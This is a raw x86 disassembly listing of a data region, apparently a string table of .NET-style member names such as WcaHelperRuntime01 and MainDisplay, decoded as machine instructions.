  407118:	addr16 gs je 0x40717b
  40711c:	inc    ebx
  40711d:	jne    0x40718b
  40711f:	je     0x407196
  407121:	jb     0x407188
  407123:	add    BYTE PTR [ebx+0x65],dh
  407126:	je     0x407187
  407128:	inc    ebx
  407129:	jne    0x407197
  40712b:	je     0x4071a2
  40712d:	jb     0x407194
  40712f:	add    BYTE PTR [edi+0x65],ah
  407132:	je     0x407193
  407134:	inc    esp
  407135:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40713c:	jns    0x40718c
  40713e:	outs   dx,DWORD PTR ds:[esi]
  40713f:	je     0x407186
  407141:	js     0x4071ac
  407143:	jae    0x4071b9
  407145:	add    BYTE PTR [edi+0x65],ah
  407148:	je     0x4071a9
  40714a:	dec    ecx
  40714b:	outs   dx,BYTE PTR ds:[esi]
  40714c:	jbe    0x4071af
  40714e:	ins    BYTE PTR es:[edi],dx
  40714f:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  407157:	add    BYTE PTR gs:[bx+0x65],ah
  40715c:	je     0x4071bd
  40715e:	dec    esi
  40715f:	outs   dx,DWORD PTR ds:[esi]
  407160:	dec    esp
  407161:	popa   
  407162:	outs   dx,BYTE PTR ds:[esi]
  407163:	addr16 push eax
  407165:	popa   
  407166:	jb     0x4071c9
  407168:	ins    DWORD PTR es:[edi],dx
  407169:	add    BYTE PTR [edi+0x65],ah
  40716c:	je     0x4071cd
  40716e:	dec    esi
  40716f:	outs   dx,DWORD PTR ds:[esi]
  407170:	dec    ebp
  407171:	jne    0x4071df
  407173:	je     0x4071b6
  407175:	jae    0x4071ea
  407177:	gs ins DWORD PTR es:[edi],dx
  407179:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40717d:	addr16 gs je 0x4071e0
  407181:	dec    esi
  407182:	outs   dx,DWORD PTR ds:[esi]
  407183:	dec    esi
  407184:	popa   
  407185:	ins    DWORD PTR es:[edi],dx
  407186:	gs jae 0x4071f9
  407189:	popa   
  40718a:	arpl   WORD PTR [ebp+0x50],sp
  40718d:	popa   
  40718e:	jb     0x4071f1
  407190:	ins    DWORD PTR es:[edi],dx
  407191:	gs je  0x4071f9
  407194:	jb     0x407196
  407196:	addr16 gs je 0x4071f9
  40719a:	dec    esi
  40719b:	outs   dx,DWORD PTR ds:[esi]
  40719c:	dec    edi
  40719d:	jne    0x407213
  40719f:	push   eax
  4071a0:	popa   
  4071a1:	jb     0x407204
  4071a3:	ins    DWORD PTR es:[edi],dx
  4071a4:	add    BYTE PTR [edi+0x65],ah
  4071a7:	je     0x407208
  4071a9:	push   esp
  4071aa:	outs   dx,DWORD PTR ds:[esi]
  4071ab:	outs   dx,DWORD PTR ds:[esi]
  4071ac:	dec    ebp
  4071ad:	popa   
  4071ae:	outs   dx,BYTE PTR ds:[esi]
  4071af:	jns    0x4071f4
  4071b1:	outs   dx,DWORD PTR ds:[esi]
  4071b2:	ins    BYTE PTR es:[edi],dx
  4071b3:	ins    BYTE PTR es:[edi],dx
  4071b4:	popa   
  4071b5:	jo     0x40722a
  4071b7:	gs inc ecx
  4071b9:	jb     0x407222
  4071bb:	jae    0x4071bd
  4071bd:	addr16 gs je 0x407220
  4071c1:	push   esp
  4071c2:	outs   dx,DWORD PTR ds:[esi]
  4071c3:	outs   dx,DWORD PTR ds:[esi]
  4071c4:	dec    ebp
  4071c5:	popa   
  4071c6:	outs   dx,BYTE PTR ds:[esi]
  4071c7:	jns    0x40721c
  4071c9:	outs   dx,BYTE PTR gs:[esi]
  4071cb:	fs gs jb 0x4071cf
  4071cf:	addr16 gs je 0x407232
  4071d3:	push   ebp
  4071d4:	outs   dx,BYTE PTR ds:[esi]
  4071d5:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  4071d9:	outs   dx,BYTE PTR ds:[esi]
  4071da:	dec    esp
  4071db:	popa   
  4071dc:	outs   dx,BYTE PTR ds:[esi]
  4071dd:	addr16 jne 0x407241
  4071e0:	add    BYTE PTR gs:[bx+0x65],ah
  4071e5:	je     0x407246
  4071e7:	push   ebp
  4071e8:	outs   dx,BYTE PTR ds:[esi]
  4071e9:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  4071ed:	outs   dx,BYTE PTR ds:[esi]
  4071ee:	push   eax
  4071ef:	popa   
  4071f0:	jb     0x407253
  4071f2:	ins    DWORD PTR es:[edi],dx
  4071f3:	gs je  0x40725b
  4071f6:	jb     0x4071f8
  4071f8:	addr16 gs je 0x40725b
  4071fc:	push   edi
  4071fd:	arpl   WORD PTR [ecx+0x48],sp
  407200:	gs ins BYTE PTR es:[edi],dx
  407202:	jo     0x407245
  407204:	jb     0x40726d
  407206:	jne    0x407275
  407208:	outs   dx,BYTE PTR gs:[esi]
  40720a:	je     0x40727f
  40720c:	xor    DWORD PTR [eax],eax
  40720e:	addr16 gs je 0x407271
  407212:	push   edi
  407213:	arpl   WORD PTR [ecx+0x48],sp
  407216:	gs ins BYTE PTR es:[edi],dx
  407218:	jo     0x40725b
  40721a:	jb     0x407283
  40721c:	jne    0x40728b
  40721e:	outs   dx,BYTE PTR gs:[esi]
  407220:	je     0x407295
  407222:	xor    al,BYTE PTR [eax]
  407224:	addr16 gs je 0x407287
  407228:	push   edi
  407229:	arpl   WORD PTR [ecx+0x48],sp
  40722c:	gs ins BYTE PTR es:[edi],dx
  40722e:	jo     0x407271
  407230:	jb     0x407299
  407232:	jne    0x4072a1
  407234:	outs   dx,BYTE PTR gs:[esi]
  407236:	je     0x4072ab
  407238:	xor    eax,DWORD PTR [eax]
  40723a:	addr16 gs je 0x40729d
  40723e:	push   edi
  40723f:	arpl   WORD PTR [ecx+0x48],sp
  407242:	gs ins BYTE PTR es:[edi],dx
  407244:	jo     0x40728f
  407246:	outs   dx,BYTE PTR ds:[esi]
  407247:	je     0x4072bb
  407249:	outs   dx,DWORD PTR ds:[esi]
  40724a:	xor    DWORD PTR [eax],eax
  40724c:	addr16 gs je 0x4072af
  407250:	push   edi
  407251:	arpl   WORD PTR [ecx+0x48],sp
  407254:	gs ins BYTE PTR es:[edi],dx
  407256:	jo     0x4072a1
  407258:	outs   dx,BYTE PTR ds:[esi]
  407259:	je     0x4072cd
  40725b:	outs   dx,DWORD PTR ds:[esi]
  40725c:	xor    al,BYTE PTR [eax]
  40725e:	addr16 gs je 0x4072c1
  407262:	push   edi
  407263:	arpl   WORD PTR [ecx+0x48],sp
  407266:	gs ins BYTE PTR es:[edi],dx
  407268:	jo     0x4072b3
  40726a:	outs   dx,BYTE PTR ds:[esi]
  40726b:	je     0x4072df
  40726d:	outs   dx,DWORD PTR ds:[esi]
  40726e:	xor    eax,DWORD PTR [eax]
  407270:	addr16 gs je 0x4072d3
  407274:	push   edi
  407275:	arpl   WORD PTR [ecx+0x48],sp
  407278:	gs ins BYTE PTR es:[edi],dx
  40727a:	jo     0x4072cb
  40727c:	jo     0x4072f2
  40727e:	imul   ebp,DWORD PTR [edi+0x6e],0x313073
  407285:	addr16 gs je 0x4072e8
  407289:	push   edi
  40728a:	arpl   WORD PTR [ecx+0x48],sp
  40728d:	gs ins BYTE PTR es:[edi],dx
  40728f:	jo     0x4072e0
  407291:	jo     0x407307
  407293:	imul   ebp,DWORD PTR [edi+0x6e],0x323073
  40729a:	addr16 gs je 0x4072fd
  40729e:	push   edi
  40729f:	arpl   WORD PTR [ecx+0x48],sp
  4072a2:	gs ins BYTE PTR es:[edi],dx
  4072a4:	jo     0x4072f5
  4072a6:	jo     0x40731c
  4072a8:	imul   ebp,DWORD PTR [edi+0x6e],0x333073
  4072af:	addr16 gs je 0x407312
  4072b3:	push   edi
  4072b4:	arpl   WORD PTR [ecx+0x48],sp
  4072b7:	gs ins BYTE PTR es:[edi],dx
  4072b9:	jo     0x40730a
  4072bb:	jo     0x407331
  4072bd:	imul   ebp,DWORD PTR [edi+0x6e],0x343073
  4072c4:	addr16 gs je 0x407327
  4072c8:	push   edi
  4072c9:	arpl   WORD PTR [ecx+0x48],sp
  4072cc:	gs ins BYTE PTR es:[edi],dx
  4072ce:	jo     0x40731f
  4072d0:	jo     0x407346
  4072d2:	imul   ebp,DWORD PTR [edi+0x6e],0x353073
  4072d9:	addr16 gs je 0x40733c
  4072dd:	push   edi
  4072de:	arpl   WORD PTR [ecx+0x48],sp
  4072e1:	gs ins BYTE PTR es:[edi],dx
  4072e3:	jo     0x407334
  4072e5:	jo     0x40735b
  4072e7:	imul   ebp,DWORD PTR [edi+0x6e],0x363073
  4072ee:	addr16 gs je 0x407351
  4072f2:	push   edi
  4072f3:	arpl   WORD PTR [ecx+0x48],sp
  4072f6:	gs ins BYTE PTR es:[edi],dx
  4072f8:	jo     0x407349
  4072fa:	jo     0x407370
  4072fc:	imul   ebp,DWORD PTR [edi+0x6e],0x373073
  407303:	addr16 gs je 0x407366
  407307:	push   edi
  407308:	arpl   WORD PTR [ecx+0x48],sp
  40730b:	gs ins BYTE PTR es:[edi],dx
  40730d:	jo     0x40735e
  40730f:	jo     0x407385
  407311:	imul   ebp,DWORD PTR [edi+0x6e],0x383073
  407318:	addr16 gs je 0x40737b
  40731c:	push   edi
  40731d:	arpl   WORD PTR [ecx+0x48],sp
  407320:	gs ins BYTE PTR es:[edi],dx
  407322:	jo     0x407373
  407324:	jo     0x40739a
  407326:	imul   ebp,DWORD PTR [edi+0x6e],0x393073
  40732d:	addr16 gs je 0x407390
  407331:	push   edi
  407332:	arpl   WORD PTR [ecx+0x48],sp
  407335:	gs ins BYTE PTR es:[edi],dx
  407337:	jo     0x407388
  407339:	jo     0x4073af
  40733b:	imul   ebp,DWORD PTR [edi+0x6e],0x303173
  407342:	addr16 gs je 0x4073a5
  407346:	push   edi
  407347:	arpl   WORD PTR [ecx+0x48],sp
  40734a:	gs ins BYTE PTR es:[edi],dx
  40734c:	jo     0x40739d
  40734e:	jo     0x4073c4
  407350:	imul   ebp,DWORD PTR [edi+0x6e],0x313173
  407357:	addr16 gs je 0x4073ba
  40735b:	push   edi
  40735c:	arpl   WORD PTR [ecx+0x48],sp
  40735f:	gs ins BYTE PTR es:[edi],dx
  407361:	jo     0x4073b2
  407363:	jo     0x4073d9
  407365:	imul   ebp,DWORD PTR [edi+0x6e],0x323173
  40736c:	addr16 gs je 0x4073cf
  407370:	push   edi
  407371:	arpl   WORD PTR [ecx+0x48],sp
  407374:	gs ins BYTE PTR es:[edi],dx
  407376:	jo     0x4073c7
  407378:	jo     0x4073ee
  40737a:	imul   ebp,DWORD PTR [edi+0x6e],0x333173
  407381:	addr16 gs je 0x4073e4
  407385:	push   edi
  407386:	arpl   WORD PTR [ecx+0x48],sp
  407389:	gs ins BYTE PTR es:[edi],dx
  40738b:	jo     0x4073dc
  40738d:	jo     0x407403
  40738f:	imul   ebp,DWORD PTR [edi+0x6e],0x343173
  407396:	addr16 gs je 0x4073f9
  40739a:	push   edi
  40739b:	arpl   WORD PTR [ecx+0x48],sp
  40739e:	gs ins BYTE PTR es:[edi],dx
  4073a0:	jo     0x4073f1
  4073a2:	jo     0x407418
  4073a4:	imul   ebp,DWORD PTR [edi+0x6e],0x353173
  4073ab:	addr16 gs je 0x40740e
  4073af:	push   edi
  4073b0:	arpl   WORD PTR [ecx+0x48],sp
  4073b3:	gs ins BYTE PTR es:[edi],dx
  4073b5:	jo     0x407406
  4073b7:	jo     0x40742d
  4073b9:	imul   ebp,DWORD PTR [edi+0x6e],0x363173
  4073c0:	addr16 gs je 0x407423
  4073c4:	push   edi
  4073c5:	arpl   WORD PTR [ecx+0x48],sp
  4073c8:	gs ins BYTE PTR es:[edi],dx
  4073ca:	jo     0x40741b
  4073cc:	jo     0x407442
  4073ce:	imul   ebp,DWORD PTR [edi+0x6e],0x373173
  4073d5:	addr16 gs je 0x407438
  4073d9:	push   edi
  4073da:	arpl   WORD PTR [ecx+0x48],sp
  4073dd:	gs ins BYTE PTR es:[edi],dx
  4073df:	jo     0x407430
  4073e1:	jo     0x407457
  4073e3:	imul   ebp,DWORD PTR [edi+0x6e],0x383173
  4073ea:	addr16 gs je 0x40744d
  4073ee:	push   edi
  4073ef:	arpl   WORD PTR [ecx+0x48],sp
  4073f2:	gs ins BYTE PTR es:[edi],dx
  4073f4:	jo     0x40744b
  4073f6:	jae    0x407459
  4073f8:	xor    DWORD PTR gs:[bx+si],eax
  4073fc:	addr16 gs je 0x40745f
  407400:	push   edi
  407401:	arpl   WORD PTR [ecx+0x48],sp
  407404:	gs ins BYTE PTR es:[edi],dx
  407406:	jo     0x40745d
  407408:	jae    0x40746b
  40740a:	xor    al,BYTE PTR gs:[bx+si]
  40740e:	addr16 gs je 0x407471
  407412:	push   edi
  407413:	arpl   WORD PTR [ecx+0x48],sp
  407416:	gs ins BYTE PTR es:[edi],dx
  407418:	jo     0x40746f
  40741a:	jae    0x40747d
  40741c:	xor    eax,DWORD PTR gs:[bx+si]
  407420:	addr16 gs je 0x407483
  407424:	push   edi
  407425:	arpl   WORD PTR [ecx+0x48],sp
  407428:	gs ins BYTE PTR es:[edi],dx
  40742a:	jo     0x407481
  40742c:	jae    0x40748f
  40742e:	addr16 gs xor al,0x0
  407432:	addr16 gs je 0x407495
  407436:	push   edi
  407437:	jb     0x4074a8
  407439:	outs   dx,BYTE PTR ds:[esi]
  40743a:	addr16 inc ecx
  40743c:	jb     0x4074a5
  40743e:	inc    ebx
  40743f:	outs   dx,DWORD PTR ds:[esi]
  407440:	jne    0x4074b0
  407442:	je     0x407444
  407444:	inc    ebx
  407445:	jne    0x4074b3
  407447:	je     0x4074be
  407449:	jb     0x4074b0
  40744b:	add    BYTE PTR [ecx+ebp*2+0x72],al
  40744f:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  407454:	jns    0x4074a4
  407456:	outs   dx,DWORD PTR ds:[esi]
  407457:	je     0x40749e
  407459:	js     0x4074c4
  40745b:	jae    0x4074d1
  40745d:	add    BYTE PTR [ecx+0x6e],cl
  407460:	jbe    0x4074c3
  407462:	ins    BYTE PTR es:[edi],dx
  407463:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  40746b:	add    BYTE PTR gs:[bp+0x6f],cl
  407470:	dec    esp
  407471:	popa   
  407472:	outs   dx,BYTE PTR ds:[esi]
  407473:	addr16 push eax
  407475:	popa   
  407476:	jb     0x4074d9
  407478:	ins    DWORD PTR es:[edi],dx
  407479:	add    BYTE PTR [esi+0x6f],cl
  40747c:	dec    ebp
  40747d:	jne    0x4074eb
  40747f:	je     0x4074c2
  407481:	jae    0x4074f6
  407483:	gs ins DWORD PTR es:[edi],dx
  407485:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  407489:	dec    esi
  40748a:	outs   dx,DWORD PTR ds:[esi]
  40748b:	dec    esi
  40748c:	popa   
  40748d:	ins    DWORD PTR es:[edi],dx
  40748e:	gs jae 0x407501
  407491:	popa   
  407492:	arpl   WORD PTR [ebp+0x50],sp
  407495:	popa   
  407496:	jb     0x4074f9
  407498:	ins    DWORD PTR es:[edi],dx
  407499:	gs je  0x407501
  40749c:	jb     0x40749e
  40749e:	dec    esi
  40749f:	outs   dx,DWORD PTR ds:[esi]
  4074a0:	dec    edi
  4074a1:	jne    0x407517
  4074a3:	push   eax
  4074a4:	popa   
  4074a5:	jb     0x407508
  4074a7:	ins    DWORD PTR es:[edi],dx
  4074a8:	add    BYTE PTR [edi+ebp*2+0x6f],dl
  4074ac:	dec    ebp
  4074ad:	popa   
  4074ae:	outs   dx,BYTE PTR ds:[esi]
  4074af:	jns    0x4074f4
  4074b1:	outs   dx,DWORD PTR ds:[esi]
  4074b2:	ins    BYTE PTR es:[edi],dx
  4074b3:	ins    BYTE PTR es:[edi],dx
  4074b4:	popa   
  4074b5:	jo     0x40752a
  4074b7:	gs inc ecx
  4074b9:	jb     0x407522
  4074bb:	jae    0x4074bd
  4074bd:	push   esp
  4074be:	outs   dx,DWORD PTR ds:[esi]
  4074bf:	outs   dx,DWORD PTR ds:[esi]
  4074c0:	dec    ebp
  4074c1:	popa   
  4074c2:	outs   dx,BYTE PTR ds:[esi]
  4074c3:	jns    0x407518
  4074c5:	outs   dx,BYTE PTR gs:[esi]
  4074c7:	fs gs jb 0x4074cb
  4074cb:	push   ebp
  4074cc:	outs   dx,BYTE PTR ds:[esi]
  4074cd:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  4074d1:	outs   dx,BYTE PTR ds:[esi]
  4074d2:	dec    esp
  4074d3:	popa   
  4074d4:	outs   dx,BYTE PTR ds:[esi]
  4074d5:	addr16 jne 0x407539
  4074d8:	add    BYTE PTR gs:[di+0x6e],dl
  4074dd:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  4074e1:	outs   dx,BYTE PTR ds:[esi]
  4074e2:	push   eax
  4074e3:	popa   
  4074e4:	jb     0x407547
  4074e6:	ins    DWORD PTR es:[edi],dx
  4074e7:	gs je  0x40754f
  4074ea:	jb     0x4074ec
  4074ec:	push   edi
  4074ed:	arpl   WORD PTR [ecx+0x48],sp
  4074f0:	gs ins BYTE PTR es:[edi],dx
  4074f2:	jo     0x407535
  4074f4:	jb     0x40755d
  4074f6:	jne    0x407565
  4074f8:	outs   dx,BYTE PTR gs:[esi]
  4074fa:	je     0x40756f
  4074fc:	xor    DWORD PTR [eax],eax
  4074fe:	push   edi
  4074ff:	arpl   WORD PTR [ecx+0x48],sp
  407502:	gs ins BYTE PTR es:[edi],dx
  407504:	jo     0x407547
  407506:	jb     0x40756f
  407508:	jne    0x407577
  40750a:	outs   dx,BYTE PTR gs:[esi]
  40750c:	je     0x407581
  40750e:	xor    al,BYTE PTR [eax]
  407510:	push   edi
  407511:	arpl   WORD PTR [ecx+0x48],sp
  407514:	gs ins BYTE PTR es:[edi],dx
  407516:	jo     0x407559
  407518:	jb     0x407581
  40751a:	jne    0x407589
  40751c:	outs   dx,BYTE PTR gs:[esi]
  40751e:	je     0x407593
  407520:	xor    eax,DWORD PTR [eax]
  407522:	push   edi
  407523:	arpl   WORD PTR [ecx+0x48],sp
  407526:	gs ins BYTE PTR es:[edi],dx
  407528:	jo     0x407573
  40752a:	outs   dx,BYTE PTR ds:[esi]
  40752b:	je     0x40759f
  40752d:	outs   dx,DWORD PTR ds:[esi]
  40752e:	xor    DWORD PTR [eax],eax
  407530:	push   edi
  407531:	arpl   WORD PTR [ecx+0x48],sp
  407534:	gs ins BYTE PTR es:[edi],dx
  407536:	jo     0x407581
  407538:	outs   dx,BYTE PTR ds:[esi]
  407539:	je     0x4075ad
  40753b:	outs   dx,DWORD PTR ds:[esi]
  40753c:	xor    al,BYTE PTR [eax]
  40753e:	push   edi
  40753f:	arpl   WORD PTR [ecx+0x48],sp
  407542:	gs ins BYTE PTR es:[edi],dx
  407544:	jo     0x40758f
  407546:	outs   dx,BYTE PTR ds:[esi]
  407547:	je     0x4075bb
  407549:	outs   dx,DWORD PTR ds:[esi]
  40754a:	xor    eax,DWORD PTR [eax]
  40754c:	push   edi
  40754d:	arpl   WORD PTR [ecx+0x48],sp
  407550:	gs ins BYTE PTR es:[edi],dx
  407552:	jo     0x4075a3
  407554:	jo     0x4075ca
  407556:	imul   ebp,DWORD PTR [edi+0x6e],0x313073
  40755d:	push   edi
  40755e:	arpl   WORD PTR [ecx+0x48],sp
  407561:	gs ins BYTE PTR es:[edi],dx
  407563:	jo     0x4075b4
  407565:	jo     0x4075db
  407567:	imul   ebp,DWORD PTR [edi+0x6e],0x323073
  40756e:	push   edi
  40756f:	arpl   WORD PTR [ecx+0x48],sp
  407572:	gs ins BYTE PTR es:[edi],dx
  407574:	jo     0x4075c5
  407576:	jo     0x4075ec
  407578:	imul   ebp,DWORD PTR [edi+0x6e],0x333073
  40757f:	push   edi
  407580:	arpl   WORD PTR [ecx+0x48],sp
  407583:	gs ins BYTE PTR es:[edi],dx
  407585:	jo     0x4075d6
  407587:	jo     0x4075fd
  407589:	imul   ebp,DWORD PTR [edi+0x6e],0x343073
  407590:	push   edi
  407591:	arpl   WORD PTR [ecx+0x48],sp
  407594:	gs ins BYTE PTR es:[edi],dx
  407596:	jo     0x4075e7
  407598:	jo     0x40760e
  40759a:	imul   ebp,DWORD PTR [edi+0x6e],0x353073
  4075a1:	push   edi
  4075a2:	arpl   WORD PTR [ecx+0x48],sp
  4075a5:	gs ins BYTE PTR es:[edi],dx
  4075a7:	jo     0x4075f8
  4075a9:	jo     0x40761f
  4075ab:	imul   ebp,DWORD PTR [edi+0x6e],0x363073
  4075b2:	push   edi
  4075b3:	arpl   WORD PTR [ecx+0x48],sp
  4075b6:	gs ins BYTE PTR es:[edi],dx
  4075b8:	jo     0x407609
  4075ba:	jo     0x407630
  4075bc:	imul   ebp,DWORD PTR [edi+0x6e],0x373073
  4075c3:	push   edi
  4075c4:	arpl   WORD PTR [ecx+0x48],sp
  4075c7:	gs ins BYTE PTR es:[edi],dx
  4075c9:	jo     0x40761a
  4075cb:	jo     0x407641
  4075cd:	imul   ebp,DWORD PTR [edi+0x6e],0x383073
  4075d4:	push   edi
  4075d5:	arpl   WORD PTR [ecx+0x48],sp
  4075d8:	gs ins BYTE PTR es:[edi],dx
  4075da:	jo     0x40762b
  4075dc:	jo     0x407652
  4075de:	imul   ebp,DWORD PTR [edi+0x6e],0x393073
  4075e5:	push   edi
  4075e6:	arpl   WORD PTR [ecx+0x48],sp
  4075e9:	gs ins BYTE PTR es:[edi],dx
  4075eb:	jo     0x40763c
  4075ed:	jo     0x407663
  4075ef:	imul   ebp,DWORD PTR [edi+0x6e],0x303173
  4075f6:	push   edi
  4075f7:	arpl   WORD PTR [ecx+0x48],sp
  4075fa:	gs ins BYTE PTR es:[edi],dx
  4075fc:	jo     0x40764d
  4075fe:	jo     0x407674
  407600:	imul   ebp,DWORD PTR [edi+0x6e],0x313173
  407607:	push   edi
  407608:	arpl   WORD PTR [ecx+0x48],sp
  40760b:	gs ins BYTE PTR es:[edi],dx
  40760d:	jo     0x40765e
  40760f:	jo     0x407685
  407611:	imul   ebp,DWORD PTR [edi+0x6e],0x323173
  407618:	push   edi
  407619:	arpl   WORD PTR [ecx+0x48],sp
  40761c:	gs ins BYTE PTR es:[edi],dx
  40761e:	jo     0x40766f
  407620:	jo     0x407696
  407622:	imul   ebp,DWORD PTR [edi+0x6e],0x333173
  407629:	push   edi
  40762a:	arpl   WORD PTR [ecx+0x48],sp
  40762d:	gs ins BYTE PTR es:[edi],dx
  40762f:	jo     0x407680
  407631:	jo     0x4076a7
  407633:	imul   ebp,DWORD PTR [edi+0x6e],0x343173
  40763a:	push   edi
  40763b:	arpl   WORD PTR [ecx+0x48],sp
  40763e:	gs ins BYTE PTR es:[edi],dx
  407640:	jo     0x407691
  407642:	jo     0x4076b8
  407644:	imul   ebp,DWORD PTR [edi+0x6e],0x353173
  40764b:	push   edi
  40764c:	arpl   WORD PTR [ecx+0x48],sp
  40764f:	gs ins BYTE PTR es:[edi],dx
  407651:	jo     0x4076a2
  407653:	jo     0x4076c9
  407655:	imul   ebp,DWORD PTR [edi+0x6e],0x363173
  40765c:	push   edi
  40765d:	arpl   WORD PTR [ecx+0x48],sp
  407660:	gs ins BYTE PTR es:[edi],dx
  407662:	jo     0x4076b3
  407664:	jo     0x4076da
  407666:	imul   ebp,DWORD PTR [edi+0x6e],0x373173
  40766d:	push   edi
  40766e:	arpl   WORD PTR [ecx+0x48],sp
  407671:	gs ins BYTE PTR es:[edi],dx
  407673:	jo     0x4076c4
  407675:	jo     0x4076eb
  407677:	imul   ebp,DWORD PTR [edi+0x6e],0x383173
  40767e:	push   edi
  40767f:	arpl   WORD PTR [ecx+0x48],sp
  407682:	gs ins BYTE PTR es:[edi],dx
  407684:	jo     0x4076db
  407686:	jae    0x4076e9
  407688:	xor    DWORD PTR gs:[bx+si],eax
  40768c:	push   edi
  40768d:	arpl   WORD PTR [ecx+0x48],sp
  407690:	gs ins BYTE PTR es:[edi],dx
  407692:	jo     0x4076e9
  407694:	jae    0x4076f7
  407696:	xor    al,BYTE PTR gs:[bx+si]
  40769a:	push   edi
  40769b:	arpl   WORD PTR [ecx+0x48],sp
  40769e:	gs ins BYTE PTR es:[edi],dx
  4076a0:	jo     0x4076f7
  4076a2:	jae    0x407705
  4076a4:	xor    eax,DWORD PTR gs:[bx+si]
  4076a8:	push   edi
  4076a9:	arpl   WORD PTR [ecx+0x48],sp
  4076ac:	gs ins BYTE PTR es:[edi],dx
  4076ae:	jo     0x407705
  4076b0:	jae    0x407713
  4076b2:	addr16 gs xor al,0x0
  4076b6:	push   edi
  4076b7:	jb     0x407728
  4076b9:	outs   dx,BYTE PTR ds:[esi]
  4076ba:	addr16 inc ecx
  4076bc:	jb     0x407725
  4076be:	inc    ebx
  4076bf:	outs   dx,DWORD PTR ds:[esi]
  4076c0:	jne    0x407730
  4076c2:	je     0x4076c4
  4076c4:	dec    ebp
  4076c5:	popa   
  4076c6:	imul   ebp,DWORD PTR [esi+0x0],0x70736944
  4076cd:	ins    BYTE PTR es:[edi],dx
  4076ce:	popa   
  4076cf:	jns    0x407719
  4076d1:	gs ins BYTE PTR es:[edi],dx
  4076d3:	jo     0x4076d5
  4076d5:	push   eax
  4076d6:	jb     0x407747
  4076d8:	arpl   WORD PTR [ebp+0x73],sp
  4076db:	jae    0x40771e
  4076dd:	jb     0x407746
  4076df:	jae    0x4076e1
  4076e1:	outs   dx,DWORD PTR ds:[esi]
  4076e2:	jo     0x407758
  4076e4:	imul   ebp,DWORD PTR [edi+0x6e],0x656d0073
  4076eb:	ins    DWORD PTR es:[edi],dx
  4076ec:	bound  esp,QWORD PTR [ebp+0x72]
  4076ef:	add    BYTE PTR [esi+0x73],ch
  4076f2:	add    BYTE PTR [ebx+0x74],ah
  4076f5:	add    BYTE PTR fs:[ebp+0x49],ch
  4076f9:	outs   dx,BYTE PTR ds:[esi]
  4076fa:	outs   dx,WORD PTR ds:[esi]
  4076fc:	add    BYTE PTR [ebp+0x65],ch
  4076ff:	je     0x407769
  407701:	add    BYTE PTR [ecx+0x6e],ch
  407704:	jbe    0x407775
  407706:	imul   esp,DWORD PTR [ebp+0x64],0x4d
  40770a:	gs je  0x407775
  40770d:	outs   dx,DWORD PTR ds:[esi]
  40770e:	add    BYTE PTR fs:[ebx+0x74],ah
  407712:	outs   dx,DWORD PTR ds:[esi]
  407713:	jb     0x407715
  407715:	jo     0x407789
  407717:	outs   dx,DWORD PTR ds:[esi]
  407718:	jo     0x40777f
  40771a:	jb     0x407790
  40771c:	jns    0x40776c
  40771e:	popa   
  40771f:	ins    DWORD PTR es:[edi],dx
  407720:	add    BYTE PTR gs:[eax+0x72],dh
  407724:	outs   dx,DWORD PTR ds:[esi]
  407725:	jo     0x40778c
  407727:	jb     0x40779d
  407729:	jns    0x40777f
  40772b:	jns    0x40779d
  40772d:	add    BYTE PTR gs:[ebx+0x74],ah
  407731:	outs   dx,DWORD PTR ds:[esi]
  407732:	jb     0x40777d
  407734:	outs   dx,BYTE PTR ds:[esi]
  407735:	imul   esi,DWORD PTR [ebp+eax*2+0x78],0x62007270
  40773d:	popa   
  40773e:	jae    0x4077a5
  407740:	push   esp
  407741:	jns    0x4077b3
  407743:	add    BYTE PTR gs:[eax+0x61],dh
  407747:	jb     0x4077aa
  407749:	ins    DWORD PTR es:[edi],dx
  40774a:	add    BYTE PTR [ebp+0x6e],dh
  40774d:	imul   esi,DWORD PTR [ecx+0x75],0x72615065
  407754:	popa   
  407755:	ins    DWORD PTR es:[edi],dx
  407756:	dec    esi
  407757:	popa   
  407758:	ins    DWORD PTR es:[edi],dx
  407759:	add    BYTE PTR gs:[eax+0x61],dh
  40775d:	jb     0x4077c0
  40775f:	ins    DWORD PTR es:[edi],dx
  407760:	dec    esi
  407761:	popa   
  407762:	ins    DWORD PTR es:[edi],dx
  407763:	add    BYTE PTR gs:[esi+0x61],ch
  407767:	ins    DWORD PTR es:[edi],dx
  407768:	add    BYTE PTR gs:[ecx+edi*2+0x70],dh
  40776d:	add    BYTE PTR gs:[ecx+0x63],ah
  407771:	je     0x4077c7
  407773:	jns    0x4077e5
  407775:	add    BYTE PTR gs:[eax+0x72],dh
  407779:	outs   dx,DWORD PTR ds:[esi]
  40777a:	jo     0x4077ca
  40777c:	popa   
  40777d:	ins    DWORD PTR es:[edi],dx
  40777e:	add    BYTE PTR gs:[ebp+0x76],ah
  407782:	add    BYTE PTR [ecx+0x72],ah
  407785:	addr16 jae 0x4077dc
  407788:	jns    0x4077fa
  40778a:	add    BYTE PTR gs:[eax+0x61],dh
  40778e:	jb     0x4077f1
  407790:	ins    DWORD PTR es:[edi],dx
  407791:	push   esp
  407792:	jns    0x407804
  407794:	add    BYTE PTR gs:[esi+0x6f],ah
  407798:	jb     0x407807
  40779a:	popa   
  40779b:	je     0x4077f0
  40779d:	je     0x407811
  40779f:	imul   ebp,DWORD PTR [esi+0x67],0x67726100
  4077a6:	jae    0x4077a8
  4077a8:	push   eax
  4077a9:	popa   
  4077aa:	jb     0x40780d
  4077ac:	ins    DWORD PTR es:[edi],dx
  4077ad:	inc    ecx
  4077ae:	jb     0x407822
  4077b0:	popa   
  4077b1:	jns    0x4077f4
  4077b3:	je     0x407829
  4077b5:	jb     0x407820
  4077b7:	bound  esi,QWORD PTR [ebp+0x74]
  4077ba:	add    BYTE PTR gs:[ebx+0x63],ah
  4077be:	jne    0x4077c0
  4077c0:	imul   esi,DWORD PTR fs:[edx+0x0],0x6d614e66
  4077c8:	add    BYTE PTR gs:[esi+0x61],dh
  4077cc:	ins    BYTE PTR es:[edi],dx
  4077cd:	jne    0x407834
  4077cf:	add    BYTE PTR [ecx+ebp*2+0x73],ah
  4077d3:	jo     0x407841
  4077d5:	popa   
  4077d6:	jns    0x407820
  4077d8:	gs ins BYTE PTR es:[edi],dx
  4077da:	jo     0x4077dc
